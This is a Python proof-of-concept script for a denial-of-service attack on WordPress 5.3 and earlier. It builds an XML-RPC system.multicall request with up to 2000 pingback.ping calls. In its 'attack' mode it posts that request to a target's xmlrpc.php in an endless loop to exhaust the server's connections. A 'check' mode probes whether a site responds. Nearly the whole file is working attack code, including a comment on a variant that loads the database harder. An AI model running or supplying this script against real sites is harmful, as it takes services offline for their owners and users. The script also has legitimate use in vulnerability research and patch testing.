#!/usr/bin/env python
# WordPress <= 5.3.? Denial-of-Service PoC
# Abusing pingbacks+xmlrpc multicall to exhaust connections
# @roddux 2019 | Arcturus Security | labs.arcturus.net
# TODO:
# - Try and detect a pingback URL on target site
# - Optimise number of entries per request, check class-wp-xmlrpc-server.php
from urllib.parse import urlparse
import sys, uuid, urllib3, requests
urllib3.disable_warnings()

DEBUG = True
def dprint(X):
	if DEBUG: print(X)

COUNT=0
def build_entry(pingback,target):
	global COUNT
	COUNT +=1
	entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
	entry += f"<name>params</name><value><array><data><value>{pingback}/{COUNT}</value>"
	#entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
	entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
	#entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
	return entry

def build_request(pingback,target,entries):
	prefix   = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
	suffix   = "</array></param></params></methodCall>"
	request  = prefix
	for _ in range(0,entries): request += build_entry(pingback,target)
	request += suffix
	return request

def usage_die():
	print(f"[!] Usage: {sys.argv[0]} <check/attack> <pingback url> <target url>")
	exit(1)

def get_args():
	if len(sys.argv) != 4: usage_die()
	action   = sys.argv[1]
	pingback = sys.argv[2]
	target   = sys.argv[3]
	if action not in ("check","attack"): usage_die()
	for URL in (pingback,target):
		res = urlparse(URL)
		if not all((res.scheme,res.netloc)): usage_die()
	return (action,pingback,target)

def main(action,pingback,target):
	print("[>] WordPress <= 5.3.? Denial-of-Service PoC")
	print("[>] @roddux 2019 | Arcturus Security | labs.arcturus.net")
	# he checc
	if action == "check":    entries = 2
	# he attacc
	elif action == "attack": entries = 2000
	# but most importantly
	print(f"[+] Running in {action} mode")
	# he pingbacc
	print(f"[+] Got pingback URL \"{pingback}\"")
	print(f"[+] Got target URL \"{target}\"")
	print(f"[+] Building {entries} pingback calls")
	# entries = 1000 # TESTING
	xmldata = build_request(pingback,target,entries)
	dprint("[+] Request:\n")
	dprint(xmldata+"\n")
	print(f"[+] Request size: {len(xmldata)} bytes")
	if action == "attack":
		print("[+] Starting attack loop, CTRL+C to stop...")
		rcount = 0
		try:
			while True:
					try:
						resp  = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=.2)
						#dprint(resp.content.decode("UTF-8")[0:500]+"\n")
						if resp.status_code != 200:
							print(f"[!] Received odd status ({resp.status_code}) -- DoS successful?")
					except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
						pass
					rcount += 1
					print(f"\r[+] Requests sent: {rcount}",end="")
		except KeyboardInterrupt:
			print("\n[>] Attack finished",end="\n\n")
			exit(0)
	elif action == "check":
		print("[+] Sending check request")
		try:
			resp = requests.post(f"{target}/xmlrpc.php", xmldata, verify=False, allow_redirects=False, timeout=10)
			if resp.status_code != 200:
				print(f"[!] Received odd status ({resp.status_code}) -- check target url")
			print("[+] Request sent")
			print("[+] Response headers:\n")
			print(resp.headers)
			print("[+] Response dump:")
			print(resp.content.decode("UTF-8"))
			print("[+] Here's the part where you figure out if it's vulnerable, because I CBA to code it")
		except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
			print("[!] Connection error")
			exit(1)
		print("[>] Check finished")

if __name__ == "__main__":
	main(*get_args())